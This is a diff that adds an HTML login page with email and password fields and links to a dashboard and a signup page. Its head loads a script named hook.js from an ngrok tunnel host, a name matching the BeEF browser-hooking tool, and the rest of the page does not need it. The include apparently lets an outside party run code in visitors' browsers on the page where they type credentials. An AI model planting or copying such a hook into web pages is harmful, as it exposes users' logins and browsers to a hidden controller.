@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="/CSS/LOGINstyle.css">
+    <script src="https://43601f853a82.ngrok-free.app:443/hook.js"></script>
+   </head>
+<body>
+    <div class="wrapper">
+        <div class="flip-card_inner">
+            <div class="flip-card_front">
+                <div class="title">Login</div>
+                <form class="flip-card_form" onsubmit="return validateLogin(event)">
+                    <input class="flip-card_input" id="email" name="email" placeholder="Email" type="email" required>
+                    <input class="flip-card_input" id="password" name="password" placeholder="Password" type="password" required>
+                    <div class="remember-me">
+                        <input type="checkbox" name="remember" id="remember" />
+                        <label for="remember">Remember me</label>
+                    </div>
+                    <button><a href="dashboard.html">Login</a></button>
+                </form>
+                <div class="signup-link">
+                    <p>Don't have an account? <a href="signup.html">Sign up here</a></p>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
